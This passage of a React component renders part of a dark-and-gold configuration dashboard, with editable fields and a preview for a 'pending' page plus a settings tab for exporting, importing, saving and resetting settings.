                    <label className="block text-xs text-[#848E9C] uppercase tracking-wider mb-2">Message Line 1</label>
                    <textarea
                      value={formState.messageLine1}
                      onChange={(e) => updateFormState('messageLine1', e.target.value)}
                      rows={2}
                      className="w-full bg-[#151A20] border border-[#474D57] rounded-lg px-4 py-3 text-[#EAECEF] resize-none focus:outline-none focus:border-[#F0B90B] transition-all"
                    />
                  </div>
                  <div>
                    <label className="block text-xs text-[#848E9C] uppercase tracking-wider mb-2">Message Line 2</label>
                    <textarea
                      value={formState.messageLine2}
                      onChange={(e) => updateFormState('messageLine2', e.target.value)}
                      rows={2}
                      className="w-full bg-[#151A20] border border-[#474D57] rounded-lg px-4 py-3 text-[#EAECEF] resize-none focus:outline-none focus:border-[#F0B90B] transition-all"
                    />
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="block text-xs text-[#848E9C] uppercase tracking-wider mb-2">Countdown (sec)</label>
                      <input
                        type="number"
                        value={formState.pendingCountdownDuration}
                        onChange={(e) => updateFormState('pendingCountdownDuration', parseInt(e.target.value) || 0)}
                        className="w-full bg-[#151A20] border border-[#474D57] rounded-lg px-4 py-3 text-[#EAECEF] focus:outline-none focus:border-[#F0B90B] transition-all"
                      />
                    </div>
                    <div>
                      <label className="block text-xs text-[#848E9C] uppercase tracking-wider mb-2">OK Button Text</label>
                      <input
                        type="text"
                        value={formState.okButtonText}
                        onChange={(e) => updateFormState('okButtonText', e.target.value)}
                        className="w-full bg-[#151A20] border border-[#474D57] rounded-lg px-4 py-3 text-[#EAECEF] focus:outline-none focus:border-[#F0B90B] transition-all"
                      />
                    </div>
                  </div>
                </div>
              </div>

              {/* Pending Page Preview */}
              <div className="bg-[rgba(30,35,41,0.6)] backdrop-blur-xl border border-[rgba(240,185,11,0.1)] rounded-2xl p-4 sm:p-6 hover:border-[rgba(240,185,11,0.3)] transition-all">
                <p className="text-xs text-[#848E9C] uppercase tracking-wider mb-4">Page Preview</p>
                <div className="bg-gradient-to-br from-[#1E2329] to-[#151A20] border border-[rgba(240,185,11,0.2)] rounded-xl p-6 text-center">
                  <div className="w-16 h-16 mx-auto relative mb-4">
                    <div className="absolute w-full h-full border-2 border-dotted border-[#F0B90B] rounded-full animate-spin" style={{ animationDuration: '20s' }} />
                    <div className="absolute top-1 left-1 right-1 bottom-1 bg-[#F0B90B] rounded-full flex items-center justify-center">
                      <svg className="w-8 h-8 text-[#1E2329]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/>
                      </svg>
                    </div>
                  </div>
                  <h3 className="text-xl font-bold text-[#F0B90B] mb-2">{formState.pendingTitle}</h3>
                  <p className="text-sm text-white mb-1">{formState.messageLine1}</p>
                  <p className="text-sm text-white mb-4">{formState.messageLine2}</p>
                  <button className="bg-[#F0B90B] text-[#0B0E11] font-bold py-2 px-8 rounded-lg">
                    {formState.okButtonText}
                  </button>
                </div>
              </div>
            </>
          )}

          {/* Settings Panel */}
          {activeTab === 'settings' && (
            <div className="lg:col-span-2 bg-[rgba(30,35,41,0.6)] backdrop-blur-xl border border-[rgba(240,185,11,0.1)] rounded-2xl p-4 sm:p-6 hover:border-[rgba(240,185,11,0.3)] transition-all">
              <div className="flex items-center gap-3 mb-6">
                <div className="w-10 h-10 rounded-lg bg-gray-500/10 flex items-center justify-center">
                  <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"/>
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
                  </svg>
                </div>
                <h2 className="text-lg font-semibold text-white">Settings</h2>
              </div>
              
              <div className="space-y-6">
                {/* Data Management */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <button onClick={handleExport} className="p-4 rounded-lg bg-[#151A20] border border-[#474D57] hover:border-[#F0B90B] group transition-all text-left">
                    <div className="w-10 h-10 rounded-lg bg-blue-500/10 flex items-center justify-center mb-3 group-hover:bg-blue-500/20">
                      <Download className="w-5 h-5 text-blue-400" />
                    </div>
                    <p className="text-sm font-medium text-white">Export Data</p>
                    <p className="text-xs text-[#848E9C] mt-1">Save all settings to JSON file</p>
                  </button>
                  
                  <button onClick={() => setShowImportModal(true)} className="p-4 rounded-lg bg-[#151A20] border border-[#474D57] hover:border-[#F0B90B] group transition-all text-left">
                    <div className="w-10 h-10 rounded-lg bg-green-500/10 flex items-center justify-center mb-3 group-hover:bg-green-500/20">
                      <Upload className="w-5 h-5 text-[#0ECB81]" />
                    </div>
                    <p className="text-sm font-medium text-white">Import Data</p>
                    <p className="text-xs text-[#848E9C] mt-1">Load configuration from JSON</p>
                  </button>
                </div>

                {/* Save Changes Button */}
                <button 
                  onClick={saveChanges}
                  className="w-full py-3 rounded-lg bg-[#F0B90B] text-[#0B0E11] font-bold hover:bg-[#F8D12F] transition-colors"
                >
                  Save All Changes
                </button>
                
                <button 
                  onClick={handleReset}
                  className="w-full py-3 rounded-lg border border-[#F6465D]/30 text-[#F6465D] hover:bg-[#F6465D]/10 transition-colors text-sm font-medium flex items-center justify-center gap-2"
                >
                  <RefreshCw className="w-4 h-4" />
                  Reset All Settings
                </button>
              </div>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
